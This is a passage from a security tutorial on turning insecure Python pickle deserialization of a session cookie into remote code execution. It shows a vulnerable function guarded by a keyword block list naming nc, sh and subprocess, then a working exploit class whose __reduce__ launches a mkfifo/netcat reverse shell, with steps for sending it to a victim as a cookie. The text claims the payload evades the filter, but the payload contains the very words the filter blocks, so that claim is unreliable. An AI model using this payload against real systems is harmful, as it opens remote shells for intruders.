In this last step we can discuss how we can gain RCE applied to our previous example.

1) We identified that a whitelisting over usual vector in applied before de-serialization(aka picke.loads)
```
def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
```

2)As you might see the default sub-process module used to get a rce it is blocked! NC, sh/bash as well so here we must use another way in! We can use the __reduce__ method from pickle library.
**object.reduce(),** we see that it returns a tuple that contains:
    A callable object that will be called to create the initial version of the object.
    A tuple of arguments for the callable object.
```
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
	
```

3)Take the B64 encoded string and send it to the victim(use it as cookie in our example), this should invoke a rev-shell back to NC.